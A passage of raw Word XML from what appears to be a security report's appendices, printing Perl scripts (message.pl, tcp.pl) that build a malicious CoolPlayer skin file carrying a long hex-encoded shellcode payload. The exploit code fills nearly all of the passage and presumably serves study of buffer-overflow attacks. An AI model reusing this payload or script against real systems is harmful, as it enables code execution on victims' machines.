                        <w:t>"\x58\x4c\x4b\x51\x4a\x47\x50\x45\x51\x5a\x4b\x4b\x53\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="605C2CFF" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x44\x50\x49\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x5a\x4e\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4B372B1F" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x31\x4b\x4f\x50\x31\x49\x50\x4b\x4c\x4e\x4c\x4d\x54\x49" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1E7E211A" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x54\x34\x43\x37\x4f\x31\x58\x4f\x54\x4d\x43\x31\x58" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="67C897F1" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x47\x5a\x4b\x5a\x54\x47\x4b\x43\x4c\x51\x34\x47\x58\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1579ECEB" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x55\x4d\x31\x4c\x4b\x51\x4a\x51\x34\x43\x31\x5a\x4b\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0182AA39" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x5a\x45\x4c\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0CC8FEB0" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x31\x5a\x4b\x4c\x4b\x43\x34\x4c\x4b\x43\x31\x4b\x58\x4d" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="15DF5F56" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x59\x50\x44\x56\x44\x45\x4c\x43\x51\x58\x43\x58\x32\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="35592A77" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x38\x47\x59\x4e\x34\x4c\x49\x4b\x55\x4b\x39\x4f\x32\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="38BEEC9D" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x48\x4c\x4e\x50\x4e\x54\x4e\x5a\x4c\x50\x52\x4d\x38\x4d" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0F8808E9" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x4b\x4f\x4b\x4f\x4b\x4f\x4b\x39\x47\x35\x54\x44\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="70CA818C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x43\x4e\x49\x48\x4b\x52\x52\x53\x4d\x57\x45\x4c\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="23D8CCD3" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x34\x56\x32\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4F3682F5" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x39\x51\x55\x54\x48\x52\x48\x52\x4c\x52\x4c\x51\x30\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="794AD5B4" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x31\x45\x38\x56\x53\x47\x42\x56\x4e\x45\x34\x45\x38\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="46F55F63" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x35\x43\x43\x43\x55\x43\x42\x4c\x48\x51\x4c\x56\x44\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4E5942B0" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4a\x4c\x49\x4d\x36\x51\x46\x4b\x4f\x56\x35\x43\x34\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="51603F17" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x39\x49\x52\x56\x30\x4f\x4b\x49\x38\x4e\x42\x50\x4d\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7461376F" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4c\x4c\x47\x45\x4c\x56\x44\x50\x52\x5a\x48\x45\x31\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5098949C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x4b\x4f\x4b\x4f\x52\x48\x52\x4f\x54\x38\x51\x48\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="088A051C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x43\x58\x43\x51\x52\x47\x52\x45\x50\x42\x43\x58\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="31F2ADE2" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4d\x45\x35\x54\x33\x54\x33\x56\x51\x49\x4b\x4d\x58\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="46057F1C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4c\x51\x34\x54\x4a\x4c\x49\x4d\x33\x52\x48\x56\x4e\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5BEA1E00" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x58\x51\x30\x51\x30\x45\x38\x52\x4c\x52\x4f\x43\x51\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3F8DD51E" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x44\x52\x48\x47\x50\x52\x50\x45\x31\x52\x59\x43\x58\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3F35C80D" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x35\x43\x52\x52\x4f\x43\x48\x45\x38\x43\x43\x52\x53\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0D4860A2" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x51\x45\x37\x43\x58\x43\x51\x47\x50\x52\x4d\x43\x55\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2CAFEC63" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x58\x51\x30\x52\x49\x54\x33\x51\x30\x45\x38\x51\x44\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="740C5B04" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x48\x43\x59\x43\x43\x50\x31\x49\x59\x4b\x38\x50\x4c\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="190CAC7B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x54\x45\x4d\x4d\x59\x4d\x31\x50\x31\x4e\x32\x51\x42\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1641A043" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x53\x56\x31\x51\x42\x4b\x4f\x4e\x30\x56\x51\x49\x50\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1E689502" w14:textId="648203DD" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x4b\x4f\x51\x45\x54\x48\x41\x41";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2D292028" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>open($FILE,"&gt;$file1");</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1DC35B60" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4D1AF44A" w14:textId="6A95383B" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00B05CEB">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">B5 - contents of </w:t>
      </w:r>
      <w:r w:rsidR="004D7F6C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>message</w:t>
      </w:r>
      <w:r w:rsidR="00B05CEB">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.pl</w:t>
      </w:r>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="77B5267E" w14:textId="797EA9F4" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="4968"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="_Toc103326492"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B6 - contents of tcp.pl</w:t>
      </w:r>
      <w:bookmarkEnd w:id="66"/>
    </w:p>
    <w:p w14:paraId="25FDB519" w14:textId="77349BE0" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251694080" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="176771C4" wp14:editId="1723C7AD">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2945219</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>57593</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3232298" cy="7623544"/>
                <wp:effectExtent l="0" t="0" r="25400" b="15875"/>
                <wp:wrapNone/>
                <wp:docPr id="41" name="Text Box 41"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3232298" cy="7623544"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:ln w="6350">
                          <a:solidFill>
                            <a:prstClr val="black"/>
                          </a:solidFill>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="7F6223E0" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$file1 = "tcp.ini"; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="730756E3" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">="; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7B9D2EE2" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
